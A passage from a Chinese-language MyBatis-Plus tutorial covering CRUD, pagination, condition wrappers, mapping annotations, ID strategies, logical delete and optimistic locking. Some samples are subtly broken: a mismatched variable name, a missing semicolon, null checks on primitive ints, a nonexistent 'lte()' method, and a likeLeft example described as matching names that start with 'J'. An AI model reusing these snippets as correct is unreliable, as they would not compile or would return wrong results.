	@Autowired
	private UserDao userDao;
	@Test
	public void testGetAll() {
		List<User> userList = userDao.selectList(null);
		System.out.println(userList);
	}
}
```

跟之前整合MyBatis相比，你会发现我们不需要在DAO接口中编写方法和SQL语句了，只需要继承`BaseMapper`接口即可。整体来说简化很多。

### 2、标准数据层开发

![image-20230902154309821](./img/小米虫爬山路-img/image-20230902154309821.png)

#### 2.1 新增

在进行新增之前，我们可以分析下新增的方法:

```java
int insert (T t)
```

* T:泛型，新增用来保存新增数据

* int:返回值，新增成功后返回1，没有新增成功返回的是0

在测试类中进行新增操作:

```java
@SpringBootTest
class Mybatisplus01QuickstartApplicationTests {

    @Autowired
    private UserDao userDao;

    @Test
    void testSave() {
        User user = new User();
        user.setName("黑马程序员");
        user.setPassword("itheima");
        user.setAge(12);
        user.setTel("4006184000");
        userDao.insert(user);
    }
}
```

执行测试后，数据库表中就会添加一条数据。

![1631013124310](./img/小米虫爬山路-img/1631013124310.png)

但是数据中的主键ID，有点长，那这个主键ID是如何来的?我们更想要的是主键自增，应该是5才对，这个是我们后面要学习的主键ID生成策略，这块的这个问题，我们暂时先放放。

#### 2.2 删除

在进行删除之前，我们可以分析下删除的方法:

```java
int deleteById (Serializable id)
```

Serializable：参数类型

思考:参数类型为什么是一个序列化类?

![1631013655771](./img/小米虫爬山路-img/1631013655771.png)

从这张图可以看出，

- String和Number是Serializable的子类，
- Number又是Float,Double,Integer等类的父类，
- 能作为主键的数据类型都已经是Serializable的子类，
- MP使用Serializable作为参数类型，就好比我们可以用Object接收任何数据类型一样。
- int:返回值类型，数据删除成功返回1，未删除数据返回0。

在测试类中进行新增操作:

```java
 @SpringBootTest
class Mybatisplus01QuickstartApplicationTests {

    @Autowired
    private UserDao userDao;

    @Test
    void testDelete() {
        userDao.deleteById(1401856123725713409L);
    }
}

```

#### 2.3 修改

在进行修改之前，我们可以分析下修改的方法:

```java
int updateById(T t);
```

- T:泛型，需要修改的数据内容，注意因为是根据ID进行修改，所以传入的对象中需要有ID属性值

- int:返回值，修改成功后返回1，未修改数据返回0

在测试类中进行新增操作:

```java
@SpringBootTest
class Mybatisplus01QuickstartApplicationTests {

    @Autowired
    private UserDao userDao;

    @Test
    void testUpdate() {
        User user = new User();
        user.setId(1L);
        user.setName("Tom888");
        user.setPassword("tom888");
        userDao.updateById(user);
    }
}
```

**说明:**修改的时候，只修改实体对象中有值的字段。

#### 2.4 根据ID查询

在进行根据ID查询之前，我们可以分析下根据ID查询的方法:

```java
T selectById (Serializable id)
```

- Serializable：参数类型,主键ID的值
- T:根据ID查询只会返回一条数据

在测试类中进行新增操作:

```java
@SpringBootTest
class Mybatisplus01QuickstartApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetById() {
        User user = userDao.selectById(2L);
        System.out.println(user);
    }
}
```

#### 2.5 查询所有

在进行查询所有之前，我们可以分析下查询所有的方法:

```java
List<T> selectList(Wrapper<T> queryWrapper)
```

- Wrapper：用来构建条件查询的条件，目前我们没有可直接传为Null
- List<T>:因为查询的是所有，所以返回的数据是一个集合

在测试类中进行新增操作:

```java
@SpringBootTest
class Mybatisplus01QuickstartApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetAll() {
        List<User> userList = userDao.selectList(null);
        System.out.println(userList);
    }
}
```

我们所调用的方法都是来自于DAO接口继承的BaseMapper类中。里面的方法有很多，我们后面会慢慢去学习里面的内容。

#### 2.6 分页功能

基础的增删改查就已经学习完了，刚才我们在分析基础开发的时候，有一个分页功能还没有实现，在MP中如何实现分页功能，就是咱们接下来要学习的内容。

分页查询使用的方法是:

```java
IPage<T> selectPage(IPage<T> page, Wrapper<T> queryWrapper)
```

- IPage:用来构建分页查询条件
- Wrapper：用来构建条件查询的条件，目前我们没有可直接传为Null
- IPage:返回值，你会发现构建分页条件和方法的返回值都是IPage

IPage是一个接口，我们需要找到它的实现类来构建它，具体的实现类，可以进入到IPage类中按ctrl+h,会找到其有一个实现类为`Page`。

##### 2.6.1 调用方法传入参数获取返回值

```java
@SpringBootTest
class Mybatisplus01QuickstartApplicationTests {

    @Autowired
    private UserDao userDao;
    
    //分页查询
    @Test
    void testSelectPage(){
        //1 创建IPage分页对象,设置分页参数,1为当前页码，3为每页显示的记录数
        IPage<User> page=new Page<>(1,3);
        //2 执行分页查询
        userDao.selectPage(page,null);
        //3 获取分页结果
        System.out.println("当前页码值："+page.getCurrent());
        System.out.println("每页显示数："+page.getSize());
        System.out.println("一共多少页："+page.getPages());
        System.out.println("一共多少条数据："+page.getTotal());
        System.out.println("数据："+page.getRecords());
    }
}
```

##### 2.6.2 设置分页拦截器

这个拦截器MP已经为我们提供好了，我们只需要将其配置成Spring管理的bean对象即可。

```java
@Configuration
public class MybatisPlusConfig {
    
    @Bean
    public MybatisPlusInterceptor mybatisPlusInterceptor(){
        //1 创建MybatisPlusInterceptor拦截器对象
        MybatisPlusInterceptor mpInterceptor=new MybatisPlusInterceptor();
        //2 添加分页拦截器
        mpInterceptor.addInnerInterceptor(new PaginationInnerInterceptor());
        return mpInterceptor;
    }
}
```

**说明:**上面的代码记不住咋办呢?

这些内容在MP的官方文档中有详细的说明，我们可以查看官方文档类配置

![1631208030131](./img/小米虫爬山路-img/1631208030131.png)

##### 2.6.3 运行测试程序

![1631019660480](./img/小米虫爬山路-img/1631019660480.png)

如果想查看MP执行的SQL语句，可以修改application.yml配置文件，

```yml
mybatis-plus:
  configuration:
    log-impl: org.apache.ibatis.logging.stdout.StdOutImpl #打印SQL日志到控制台
```

打开日志后，就可以在控制台打印出对应的SQL语句，开启日志功能性能就会受到影响，调试完后记得关闭。

### 3、DQL编程控制

#### 3.1 条件查询



##### 3.1.1 普通的条件查询

* MyBatisPlus将书写复杂的SQL查询条件进行了封装，使用编程的形式完成查询条件的组合。

这个我们在前面都有见过，比如查询所有和分页查询的时候，都有看到过一个`Wrapper`类，这个类就是用来构建查询条件的

在进行查询的时候，我们的入口是在Wrapper这个类上，因为它是一个接口，所以我们需要去找它对应的实现类，关于实现类也有很多，说明我们有多种构建查询条件对象的方式，

![1631021942869](./img/小米虫爬山路-img/1631021942869.png)

1. 先来看第一种:==QueryWrapper==

```java
@SpringBootTest
class Mybatisplus02DqlApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetAll(){
        QueryWrapper qw = new QueryWrapper();
        qw.lt("age",18);
        List<User> userList = userDao.selectList(qw);
        System.out.println(userList);
    }
}
```

* lt: 小于(<) ,最终的sql语句为

  ```sql
  SELECT id,name,password,age,tel FROM user WHERE (age < ?)
  ```

第一种方式介绍完后，有个小问题就是在写条件的时候，容易出错，比如age写错，就会导致查询不成功

2. 接着来看第二种:==QueryWrapper的基础上使用lambda==

```java
@SpringBootTest
class Mybatisplus02DqlApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetAll(){
        QueryWrapper<User> qw = new QueryWrapper<User>();
        qw.lambda().lt(User::getAge, 10);//添加条件
        List<User> userList = userDao.selectList(qw);
        System.out.println(userList);
    }
}
```

* User::getAget,为lambda表达式中的，类名::方法名，最终的sql语句为:

```sql
SELECT id,name,password,age,tel FROM user WHERE (age < ?)
```

此时我们再次编写条件的时候，就不会存在写错名称的情况，但是qw后面多了一层lambda()调用

3. 接着来看第三种:==LambdaQueryWrapper==（使用最多）

```java
@SpringBootTest
class Mybatisplus02DqlApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetAll(){
        LambdaQueryWrapper<User> lqw = new LambdaQueryWrapper<User>();
        lqw.lt(User::getAge, 30).gt(User::getAge, 10);//  链式编程，这输出同时满足年龄小于30和大于10的数据
        //这句相当于sql  SELECT id,name,password,age,tel FROM user WHERE (age < ? AND age > ?)
        lqw.lt(User::getAge, 10).or().gt(User::getAge, 30)// 或
         //这句相当于sql  SELECT id,name,password,age,tel FROM user WHERE (age < ? OR age > ?)
        List<User> userList = userDao.selectList(lqw);
        System.out.println(userList);
    }
}
```

**注意:**构建LambdaQueryWrapper的时候泛型不能省。

##### 3.1.2 判断NUll查询

类似于Mybatis的动态sql语句。

在查询信息时有时不会输入全部查询的信息，而是输入一部分。如查询用户，可以输入用户名和用户手机号，也可以只输入用户名。

```java
@SpringBootTest
class Mybatisplus02DqlApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetAll(){
      //假设以下四个是前端传入的信息
        String name = .....;
        Long phone = ......;
        int minAge = ......;
        int maxAge = ......;
        LambdaQueryWrapper<User> lqw = new LambdaQueryWrapper<User>();
        lqw.lt(null!=maxAge,User::getAge, maxAge)
             .gt(null!=minAge,User::getAge, minAge)
             .eq(null!=name,User::getName,name)
             .eq(null!=phone,User::getPhone,phone);
        //上述的查询语句就相当于在使用xml文件写动态sql语句来查询
        List<User> userList = userDao.selectList(lqw);
        System.out.println(userList);
    }
}
```

#### 3.2 查询投影



##### 3.2.1 查询指定字段

目前我们在查询数据的时候，什么都没有做默认就是查询表中所有字段的内容，我们所说的查询投影即不查询所有字段，只查询出指定内容的数据。

具体如何来实现?

```java
@SpringBootTest
class Mybatisplus02DqlApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetAll(){
        LambdaQueryWrapper<User> lqw = new LambdaQueryWrapper<User>();
        lqw.select(User::getId,User::getName,User::getAge);
        List<User> userList = userDao.selectList(lqw);
        System.out.println(userList);
    }
}
```

* select(...)方法用来设置查询的字段列，可以设置多个，最终的sql语句为:

  ```sql
  SELECT id,name,age FROM user
  ```

##### 3.2.2 聚合查询

> 需求:聚合函数查询，完成count、max、min、avg、sum的使用
>
> count:总记录数
>
> max:最大值
>
> min:最小值
>
> avg:平均值
>
> sum:求和

```java
@SpringBootTest
class Mybatisplus02DqlApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetAll(){
        QueryWrapper<User> lqw = new QueryWrapper<User>();
        //lqw.select("count(*) as count");
        //相当于SELECT count(*) as count FROM user
        //lqw.select("max(age) as maxAge");
        //相当于SELECT max(age) as maxAge FROM user
        //lqw.select("min(age) as minAge");
        //相当于SELECT min(age) as minAge FROM user
        //lqw.select("sum(age) as sumAge");
        //相当于SELECT sum(age) as sumAge FROM user
        lqw.select("avg(age) as avgAge");
        //相当于SELECT avg(age) as avgAge FROM user
        List<Map<String, Object>> userList = userDao.selectMaps(lqw);//这里不能使用selectList,因为使用selectList返回的是用User来封装对应的数据
        System.out.println(userList);
    }
}
```

为了在做结果封装的时候能够更简单，我们将上面的聚合函数都起了个名称，方面后期来获取这些数据

##### 3.2.3 分组查询

> 需求:分组查询，完成 group by的查询使用

```java
@SpringBootTest
class Mybatisplus02DqlApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetAll(){
        QueryWrapper<User> lqw = new QueryWrapper<User>();
        lqw.select("count(*) as count,tel");
        lqw.groupBy("tel");
        List<Map<String, Object>> list = userDao.selectMaps(lqw);
        System.out.println(list);
    }
}
```

* groupBy为分组，最终的sql语句为

  ```sql
  SELECT count(*) as count,tel FROM user GROUP BY tel
  ```

**注意:**

* 聚合与分组查询，无法使用lambda表达式来完成
* MP只是对MyBatis的增强，如果MP实现不了，我们可以直接在DAO接口中使用MyBatis的方式实现

#### 3.3 查询条件

前面我们只使用了lt()和gt(),除了这两个方法外，MP还封装了很多条件对应的方法，这一节我们重点把MP提供的查询条件方法进行学习下。

MP的查询条件有很多:

* 范围匹配（> 、 = 、between）
* 模糊匹配（like）
* 空判定（null）
* 包含性匹配（in）
* 分组（group）
* 排序（order）
* ……

##### 3.3.1 等值查询

> 需求:根据用户名和密码查询用户信息

```java
@SpringBootTest
class Mybatisplus02DqlApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetAll(){
        LambdaQueryWrapper<User> lqw = new LambdaQueryWrapper<User>();
        lqw.eq(User::getName, "Jerry").eq(User::getPassword, "jerry");
        User loginUser = userDao.selectOne(lqw);
        System.out.println(loginUser);
    }
}
```

* eq()： 相当于 `=`,对应的sql语句为

  ```sql
  SELECT id,name,password,age,tel FROM user WHERE (name = ? AND password = ?)
  ```

* selectList：查询结果为多个或者单个

* selectOne:查询结果为单个 

##### 3.3.2 范围查询

> 需求:对年龄进行范围查询，使用lt()、le()、gt()、ge()、between()进行范围查询

```java
@SpringBootTest
class Mybatisplus02DqlApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetAll(){
        LambdaQueryWrapper<User> lqw = new LambdaQueryWrapper<User>();
        lqw.between(User::getAge, 10, 30);
        //SELECT id,name,password,age,tel FROM user WHERE (age BETWEEN ? AND ?)
        List<User> userList = userDao.selectList(lqw);
        System.out.println(userList);
    }
}
```

* gt():大于(>)
* ge():大于等于(>=)
* lt():小于(<)
* lte():小于等于(<=)
* between():between ? and ?

##### 3.3.3 模糊查询

> 需求:查询表中name属性的值以`J`开头的用户信息,使用like进行模糊查询

```java
@SpringBootTest
class Mybatisplus02DqlApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetAll(){
        LambdaQueryWrapper<User> lqw = new LambdaQueryWrapper<User>();
        lqw.likeLeft(User::getName, "J");
        //SELECT id,name,password,age,tel FROM user WHERE (name LIKE ?)
        List<User> userList = userDao.selectList(lqw);
        System.out.println(userList);
    }
}
```

* like():前后加百分号,如 %J%
* likeLeft():前面加百分号,如 %J
* likeRight():后面加百分号,如 J%

##### 3.3.4 排序查询

> 需求:查询所有数据，然后按照id降序

```java
@SpringBootTest
class Mybatisplus02DqlApplicationTests {

    @Autowired
    private UserDao userDao;
    
    @Test
    void testGetAll(){
        LambdaQueryWrapper<User> lwq = new LambdaQueryWrapper<>();
        /**
         * condition ：条件，返回boolean，
         		当condition为true，进行排序，如果为false，则不排序
         * isAsc:是否为升序，true为升序，false为降序
         * columns：需要操作的列
         */
        lwq.orderBy(true,false, User::getId);

        List<User> users = userDao.selectList(lqw);
    }
}
```

除了上面演示的这种实现方式，还有很多其他的排序方法可以被调用，如图:

![1631209838333](./img/小米虫爬山路-img/1631209838333.png)

* orderBy排序
  * condition:条件，true则添加排序，false则不添加排序
  * isAsc:是否为升序，true升序，false降序
  * columns:排序字段，可以有多个
* orderByAsc/Desc(单个column):按照指定字段进行升序/降序
* orderByAsc/Desc(多个column):按照多个字段进行升序/降序
* orderByAsc/Desc
  * condition:条件，true添加排序，false不添加排序
  * 多个columns：按照多个字段进行排序

除了上面介绍的这几种查询条件构建方法以外还会有很多其他的方法，比如isNull,isNotNull,in,notIn等等方法可供选择，具体参考官方文档的条件构造器来学习使用，具体的网址为:

`https://mp.baomidou.com/guide/wrapper.html#abstractwrapper`

#### 3.4 映射匹配兼容性

##### 3.4.1 问题1

表字段与编码属性设计不同步

当表的列名和实体类的属性名不一致时，就会导致数据封装不到模型对象，这个时候就需要其中一方做出修改，那如果前提是两边都不能改又该如何解决?

MP给我们提供了一个注解`@TableField`,使用该注解可以实现模型类属性名和表的列名之间的映射关系

![image-20230903144944325](./img/小米虫爬山路-img/image-20230903144944325.png)

这时实体类中的password就对应着数据库中的pwd

##### 3.4.2 问题2

编码中添加了数据库中未定义的属性

当实体类中多了一个数据库表不存在的字段，就会导致生成的sql语句中在select的时候查询了数据库不存在的字段，程序运行就会报错，错误信息为:

==Unknown column '多出来的字段名称' in 'field list'==

具体的解决方案用到的还是`@TableField`注解，它有一个属性叫`exist`，设置该字段是否在数据库表中存在，如果设置为false则不存在，生成sql语句查询的时候，就不会再查询该字段了。

![image-20230903150254906](./img/小米虫爬山路-img/image-20230903150254906.png)

##### 3.4.3 问题3

采用默认查询开放了更多的字段查看权限

查询表中所有的列的数据，就可能把一些敏感数据查询到返回给前端，这个时候我们就需要限制哪些字段默认不要进行查询。解决方案是`@TableField`注解的一个属性叫`select`，该属性设置默认是否需要查询该字段的值，true(默认值)表示默认查询该字段，false表示默认不查询该字段。

![image-20230903150424902](./img/小米虫爬山路-img/image-20230903150424902.png)

==**@TableField**==

| 名称     | @TableField                                                  |
| -------- | ------------------------------------------------------------ |
| 类型     | ==属性注解==                                                 |
| 位置     | 模型类属性定义上方                                           |
| 作用     | 设置当前属性对应的数据库表中的字段关系                       |
| 相关属性 | value(默认)：设置数据库表字段名称<br/>exist:设置属性在数据库表字段中是否存在，默认为true，此属性不能与value合并使用<br/>select:设置属性是否参与查询，此属性与select()映射配置不冲突 |

##### 3.4.4 问题4

表名与编码开发设计不同步

该问题主要是表的名称和模型类的名称不一致，导致查询失败，这个时候通常会报如下错误信息:

==Table 'databaseName.tableNaem' doesn't exist==,翻译过来就是数据库中的表不存在。

![image-20230903150549173](./img/小米虫爬山路-img/image-20230903150549173.png)

解决方案是使用MP提供的另外一个注解`@TableName`来设置表与模型类之间的对应关系。

![1631031915632](./img/小米虫爬山路-img/1631031915632.png)

==**@TableName**==

| 名称     | @TableName                    |
| -------- | ----------------------------- |
| 类型     | ==类注解==                    |
| 位置     | 模型类定义上方                |
| 作用     | 设置当前类对应于数据库表关系  |
| 相关属性 | value(默认)：设置数据库表名称 |

### 4、DML编程控制

#### 4.1 id生成策略控制

前面我们在新增的时候留了一个问题，就是新增成功后，主键ID是一个很长串的内容，我们更想要的是按照数据库表字段进行自增长，在解决这个问题之前，我们先来分析下ID该如何选择:

* 不同的表应用不同的id生成策略
  * 日志：自增（1,2,3,4，……）
  * 购物订单：特殊规则（FQ23948AK3843）
  * 外卖单：关联地区日期等信息（10 04 20200314 34 91）
  * 关系表：可省略id
  * ……

不同的业务采用的ID生成方式应该是不一样的，那么在MP中都提供了哪些主键生成策略，以及我们该如何进行选择?

在这里我们又需要用到MP的一个注解叫`@TableId`

==**@TableId**==

| 名称     | @TableId                                                     |
| -------- | ------------------------------------------------------------ |
| 类型     | ==属性注解==                                                 |
| 位置     | 模型类中用于表示主键的属性定义上方                           |
| 作用     | 设置当前类中主键属性的生成策略                               |
| 相关属性 | value(默认)：设置数据库表主键名称<br/>type:设置主键属性的生成策略，值查照IdType的枚举值 |

![image-20230903152409174](./img/小米虫爬山路-img/image-20230903152409174.png)

从源码中可以看到，有如下几种生成策略:

- AUTO:自动生成id

* NONE: 不设置id生成策略
* INPUT:用户手工输入id
* ASSIGN_ID:雪花算法生成id(可兼容数值型与字符串型)
* ASSIGN_UUID:以UUID生成算法作为id生成策略
* 其他的几个策略均已过时，都将被ASSIGN_ID和ASSIGN_UUID代替掉。



##### 4.1.1 AUTO策略

会发现`AUTO`的作用是==使用数据库ID自增==，在使用该策略的时候一定要确保对应的数据库表==设置了ID主键自增==，否则无效。

对实体类添加注解

```java
@Data
@TableName("tbl_user")
public class User {
    @TableId(type = IdType.AUTO)//在添加数据时就会自动根据数据库的id自增添加数据
    private Long id;
    private String name;
    @TableField(value="pwd",select=false)
    private String password;
    private Integer age;
    private String tel;
    @TableField(exist=false)
    private Integer online;
}
```

##### 4.1.2 INPUT策略

```java
@Data
@TableName("tbl_user")
public class User {
    @TableId(type = IdType.INPUT)//这个在添加数据时就要给id添加值
    private Long id;
    private String name;
    @TableField(value="pwd",select=false)
    private String password;
    private Integer age;
    private String tel;
    @TableField(exist=false)
    private Integer online;
}
```

**注意:**这种ID生成策略，需要将表的自增策略删除掉

```java
@SpringBootTest
class Mybatisplus03DqlApplicationTests {

    @Autowired
    private UserDao userDao;
	
    @Test
    void testSave(){
        User user = new User();
        //设置主键ID的值
        user.setId(666L);
        user.setName("黑马程序员");
        user.setPassword("itheima");
        user.setAge(12);
        user.setTel("4006184000");
        userDao.insert(user);
    }
}
```

##### 4.1.3 ASSIGN_ID策略

```java
@Data
@TableName("tbl_user")
public class User {
    @TableId(type = IdType.ASSIGN_ID)
    private Long id;
    private String name;
    @TableField(value="pwd",select=false)
    private String password;
    private Integer age;
    private String tel;
    @TableField(exist=false)
    private Integer online;
}
```

**注意:**这种生成策略，不需要手动设置ID，如果手动设置ID，则会使用自己设置的值;不手动输入mybatisplus框架会使用雪花算法来创造一个id。（默认使用这个策略）

==**雪花算法**==

雪花算法(SnowFlake),是Twitter官方给出的算法实现 是用Scala写的。其生成的结果是一个64bit大小整数，它的结构如下图:

![1631243987800](./img/小米虫爬山路-img/1631243987800.png)

1. 1bit,不用,因为二进制中最高位是符号位，1表示负数，0表示正数。生成的id一般都是用整数，所以最高位固定为0。
2. 41bit-时间戳，用来记录时间戳，毫秒级
3. 10bit-工作机器id，用来记录工作机器id,其中高位5bit是数据中心ID其取值范围0-31，低位5bit是工作节点ID其取值范围0-31，两个组合起来最多可以容纳1024个节点
4. 序列号占用12bit，每个节点每毫秒0开始不断累加，最多可以累加到4095，一共可以产生4096个ID

##### 4.1.4 ASSIGN_UUID策略

使用uuid需要注意的是，主键的类型不能是Long，而应该改成String类型，数据库的主键类型为varchar，长度要大于32，因为UUID生成的主键为32位，如果长度小的话就会导致插入失败。

```java
@Data
@TableName("tbl_user")
public class User {
    @TableId(type = IdType.ASSIGN_UUID)
    private String id;
    private String name;
    @TableField(value="pwd",select=false)
    private String password;
    private Integer age;
    private String tel;
    @TableField(exist=false)
    private Integer online;
}
```

##### 4.1.5 区别

介绍了这些主键ID的生成策略，我们以后该用哪个呢?

* NONE: 不设置id生成策略，MP不自动生成，约等于INPUT,所以这两种方式都需要用户手动设置，但是手动设置第一个问题是容易出现相同的ID造成主键冲突，为了保证主键不冲突就需要做很多判定，实现起来比较复杂
* AUTO:数据库ID自增,这种策略适合在数据库服务器只有1台的情况下使用,不可作为分布式ID使用
* ASSIGN_UUID:可以在分布式的情况下使用，而且能够保证唯一，但是生成的主键是32位的字符串，长度过长占用空间而且还不能排序，查询性能也慢
* ASSIGN_ID:可以在分布式的情况下使用，生成的是Long类型的数字，可以排序性能也高，但是生成的策略和服务器时间有关，如果修改了系统时间就有可能导致出现重复主键
* 综上所述，每一种主键策略都有自己的优缺点，根据自己项目业务的实际情况来选择使用才是最明智的选择。

##### 4.1.6 简化配置

如果要在项目中的每一个模型类上都需要使用相同的生成策略，按照上述的方法就要在每一个实体类的id属性上添加`@TableId`注解来是设置主键的策略，这样十分繁琐。

我们可以使用配置文件来统一设置id的生成策略。

```xml
mybatis-plus:
  global-config:
    db-config:
    	id-type: assign_id 
```

配置完成后，每个模型类的主键ID策略都将成为assign_id.

#### 4.2 多记录操作（批量删除）

一般用户删除数据时会使用批量删除操作来进行。

具体该如何实现多条删除，我们找找对应的API方法

```java
int deleteBatchIds(@Param(Constants.COLLECTION) Collection<? extends Serializable> idList);
```

翻译方法的字面意思为:删除（根据ID 批量删除）,参数是一个集合，可以存放多个id值。

> 需求:根据传入的id集合将数据库表中的数据删除掉。

```java
@SpringBootTest
class Mybatisplus03DqlApplicationTests {

    @Autowired
    private UserDao userDao;
	
    @Test
    void testDelete(){
        //删除指定多条数据
        List<Long> list = new ArrayList<>();
        list.add(1402551342481838081L);
        list.add(1402553134049501186L);
        list.add(1402553619611430913L);
        userDao.deleteBatchIds(list);
    }
}
```

执行成功后，数据库表中的数据就会按照指定的id进行删除。

除了按照id集合进行批量删除，也可以按照id集合进行批量查询。

#### 4.3 逻辑删除

在对数据进行删除操作时要判断好这个数据到底能不能真正的删除，如果删除后会不会对其他的表有破坏。

接下来要讲解是删除中比较重要的一个操作，逻辑删除，先来分析下问题:

![1631246806130](./img/小米虫爬山路-img/1631246806130.png)

* 这是一个员工和其所签的合同表，关系是一个员工可以签多个合同，是一个一(员工)对多(合同)的表

* 员工ID为1的张业绩，总共签了三个合同，如果此时他离职了，我们需要将员工表中的数据进行删除，会执行delete操作

* 如果表在设计的时候有主外键关系，那么同时也得将合同表中的前三条数据也删除掉

  ![1631246997190](./img/小米虫爬山路-img/1631246997190.png)

* 后期要统计所签合同的总金额，就会发现对不上，原因是已经将员工1签的合同信息删除掉了

* 如果只删除员工不删除合同表数据，那么合同的员工编号对应的员工信息不存在，那么就会出现垃圾数据，就会出现无主合同，根本不知道有张业绩这个人的存在

* 所以经过分析，我们不应该将表中的数据删除掉，而是需要进行保留，但是又得把离职的人和在职的人进行区分，这样就解决了上述问题，如:

  ![1631247188218](./img/小米虫爬山路-img/1631247188218.png)

* 区分的方式，就是在员工表中添加一列数据`deleted`，如果为0说明在职员工，如果离职则将其改完1，（0和1所代表的含义是可以自定义的）

所以对于删除操作业务问题来说有:

* 物理删除:业务数据从数据库中丢弃，执行的是delete操作
* 逻辑删除:为数据设置是否可用状态字段，删除时设置状态字段为不可用状态，数据保留在数据库中，执行的是update操作

又有一种方式比如用户注销后是不能删除的，要进行数据保留。

##### 4.3.1 第一步

修改数据库表添加`deleted`列

字段名可以任意，内容也可以自定义，比如`0`代表正常，`1`代表删除，可以在添加列的同时设置其默认值为`0`正常。

![image-20230903172104524](./img/小米虫爬山路-img/image-20230903172104524.png)

##### 4.3.2 第二步

实体类添加属性

(1)添加与数据库表的列对应的一个属性名，名称可以任意，如果和数据表列名对不上，可以使用@TableField进行关系映射，如果一致，则会自动对应。

(2)标识新增的字段为逻辑删除字段，使用`@TableLogic`

```java
@Data
public class User {
    @TableId(type = IdType.ASSIGN_UUID)
    private String id;
    private String name;
    @TableField(value="pwd",select=false)
    private String password;
    private Integer age;
    private String tel;
    @TableField(exist=false)
    private Integer online;
    @TableLogic(value="0",delval="1")
    //value为正常数据的值，delval为删除数据的值
    private Integer deleted;
}
```

##### 4.3.3 第三步

运行删除方法

```java
@SpringBootTest
class Mybatisplus03DqlApplicationTests {

    @Autowired
    private UserDao userDao;
	
    @Test
    void testDelete(){
       userDao.deleteById(1L);
    }
}
```

![image-20230903172537658](./img/小米虫爬山路-img/image-20230903172537658.png)

从测试结果来看，逻辑删除最后走的是update操作，会将指定的字段修改成删除状态对应的值。

**思考**

逻辑删除，对查询有没有影响呢?

运行测试，会发现打印出来的sql语句中会多一个查询条件，如:

![1631248019999](./img/小米虫爬山路-img/1631248019999.png)

可想而知，MP的逻辑删除会将所有的查询都添加一个未被删除的条件，也就是已经被删除的数据是不应该被查询出来的。

如果还是想把已经删除的数据都查询出来该如何实现呢? 答：就写原生的mybatis代码



==**@TableLogic**==

| 名称     | @TableLogic                               |
| -------- | ----------------------------------------- |
| 类型     | ==属性注解==                              |
| 位置     | 模型类中用于表示删除字段的属性定义上方    |
| 作用     | 标识该字段为进行逻辑删除的字段            |
| 相关属性 | value：逻辑未删除值<br/>delval:逻辑删除值 |

#### 4.4 乐观锁

##### 4.4.1 概念

在讲解乐观锁之前，我们还是先来分析下问题:

业务并发现象带来的问题:==秒杀==

* 假如有100个商品或者票在出售，为了能保证每个商品或者票只能被一个人购买，如何保证不会出现超买或者重复卖
* 对于这一类问题，其实有很多的解决方案可以使用
* 第一个最先想到的就是锁，锁在一台服务器中是可以解决的，但是如果在多台服务器下锁就没有办法控制，比如12306有两台服务器在进行卖票，在两台服务器上都添加锁的话，那也有可能会导致在同一时刻有两个线程在进行卖票，还是会出现并发问题
* 我们接下来介绍的这种方式是针对于小型企业的解决方案，因为数据库本身的性能就是个瓶颈，如果对其并发量超过2000以上的就需要考虑其他的解决方案了。

简单来说，乐观锁主要解决的问题是当要更新一条记录的时候，希望这条记录没有被别人更新。

作用：修改同一个数据时只能有一个人。即多人修改同一条数据时只能是其中一个人能成功。

##### 4.4.2 实现思路

乐观锁的实现方式:

> * 数据库表中添加version列，比如默认值给1
> * 第一个线程要修改数据之前，取出记录时，获取当前数据库中的version=1
> * 第二个线程要修改数据之前，取出记录时，获取当前数据库中的version=1
> * 第一个线程执行更新时，set version = newVersion where version = oldVersion
>   * newVersion = version+1  [2]
>   * oldVersion = version  [1]
> * 第二个线程执行更新时，set version = newVersion where version = oldVersion
>   * newVersion = version+1  [2]
>   * oldVersion = version  [1]
> * 假如这两个线程都来更新数据，第一个和第二个线程都可能先执行
>   * 假如第一个线程先执行更新，会把version改为2，
>   * 第二个线程再更新的时候，set version = 2 where version = 1,此时数据库表的数据version已经为2，所以第二个线程会修改失败
>   * 假如第二个线程先执行更新，会把version改为2，
>   * 第一个线程再更新的时候，set version = 2 where version = 1,此时数据库表的数据version已经为2，所以第一个线程会修改失败
>   * 不管谁先执行都会确保只能有一个线程更新数据，这就是MP提供的乐观锁的实现原理分析。

上面所说的步骤具体该如何实现呢?

##### 4.4.3 实现步骤

==**第一步：**==在数据库对应要修改的表中添加一个字段，比如使用`version`,给列设置默认值为`1`

![image-20230903234606528](./img/小米虫爬山路-img/image-20230903234606528.png)

==**第二步：**==在实体类中添加对应的属性

```java
@Data
//@TableName("tbl_user") 可以不写是因为配置了全局配置
public class User {
    @TableId(type = IdType.ASSIGN_UUID)
    private String id;
    private String name;
    @TableField(value="pwd",select=false)
    private String password;
    private Integer age;
    private String tel;
    @TableField(exist=false)
    private Integer online;
    private Integer deleted;
    @Version
    private Integer version;
}
```

==**第三步：**==添加乐观锁的拦截器

```java
@Configuration
public class MpConfig {
    @Bean
    public MybatisPlusInterceptor mpInterceptor() {
        //1.定义Mp拦截器
        MybatisPlusInterceptor mpInterceptor = new MybatisPlusInterceptor();
        //2.添加乐观锁拦截器
        mpInterceptor.addInnerInterceptor(new OptimisticLockerInnerInterceptor());
        return mpInterceptor;
    }
}
```

==**第四步：**==执行更新操作

首先第一步应该是拿到表中的version，然后拿version当条件在将version加1更新回到数据库表中，所以我们在查询的时候，需要对其进行查询

```java
@SpringBootTest
class Mybatisplus03DqlApplicationTests {

    @Autowired
    private UserDao userDao;
	
    @Test
    void testUpdate(){
        //1.先通过要修改的数据id将当前数据查询出来
        User user = userDao.selectById(3L);
        //2.将要修改的属性逐一设置进去
        user.setName("Jock888");
        userDao.updateById(user);
    }
}
```

## 十三、Minio

### 1、介绍

分布式文件系统应用场景

互联网海量非结构化数据的存储需求

电商网站:海量商品图片

视频网站:海量视频文件

网盘:海量文件

社交网站:海量图片

#### 1.1 Minio介绍

